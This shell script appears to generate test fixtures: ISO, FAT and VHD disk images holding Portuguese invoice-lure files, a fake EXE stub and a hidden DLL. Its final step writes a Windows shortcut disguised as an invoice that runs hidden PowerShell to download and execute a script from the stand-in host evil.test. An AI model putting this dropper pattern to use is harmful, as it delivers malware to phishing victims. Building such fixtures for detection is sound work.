set -e
apk add --no-cache xorriso dosfstools mtools python3 py3-pip sfdisk >/dev/null 2>&1
cd /out
rm -rf src && mkdir -p src/docs/Relatórios
printf 'MZ\x90\x00 fake exe' > src/fatura_documento.exe
printf 'boleto falso' > src/docs/Relatórios/boleto-novembro-2026.pdf
printf 'conteudo oculto' > src/oculto.dll
printf 'texto' > src/LEIA-ME.txt
xorriso -as mkisofs -quiet -J -joliet-long -r -V "PEDIDO_2026" -o pedido.iso src
# FAT16 de 8 MB com nome longo e arquivo oculto.
rm -f fat.img && mkfs.fat -C -F 16 -n FATURAS fat.img 32768 >/dev/null
export MTOOLS_SKIP_CHECK=1
mcopy -i fat.img src/fatura_documento.exe ::/fatura_documento_longo_nome.exe
mmd -i fat.img ::/Pasta
mcopy -i fat.img src/LEIA-ME.txt ::/Pasta/LEIA-ME.txt
mcopy -i fat.img src/oculto.dll ::/oculto.dll
mattrib -i fat.img +h ::/oculto.dll
# FAT32 de 40 MB.
rm -f fat32.img && mkfs.fat -C -F 32 -n F32 fat32.img 65536 >/dev/null
mcopy -i fat32.img src/LEIA-ME.txt ::/arquivo_em_fat32.txt
# Disco com MBR (particao FAT16 em 1 MiB) + rodape VHD fixo.
rm -f disk.raw && truncate -s 40M disk.raw
printf 'label: dos\nstart=2048, type=6\n' | sfdisk -q disk.raw
dd if=fat.img of=disk.raw bs=512 seek=2048 conv=notrunc status=none
python3 - <<'PY'
import struct, time
raw = open('/out/disk.raw','rb').read()
f = bytearray(512)
f[0:8] = b'conectix'
struct.pack_into('>I', f, 8, 2); struct.pack_into('>I', f, 12, 0x00010000)
struct.pack_into('>Q', f, 16, 0xFFFFFFFFFFFFFFFF)
struct.pack_into('>Q', f, 40, len(raw)); struct.pack_into('>Q', f, 48, len(raw))
struct.pack_into('>I', f, 60, 2)
s = (~sum(f) & 0xFFFFFFFF); struct.pack_into('>I', f, 64, s)
open('/out/disk.vhd','wb').write(raw + bytes(f))
PY
pip install --quiet --break-system-packages pylnk3==0.4.2 >/dev/null 2>&1 || pip install --quiet --break-system-packages pylnk3 >/dev/null 2>&1
python3 - <<'PY'
import pylnk3
lnk = pylnk3.for_file(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
    arguments=' -w hidden -nop -c "iwr http://evil.test/a.ps1 | iex"',
    description='Fatura de novembro', icon_file=r'C:\Windows\System32\imageres.dll', icon_index=2,
    work_dir=r'C:\Users\Public', window_mode='Minimized')
lnk.save('/out/fatura.lnk')
print('lnk ok')
PY
ls -la /out
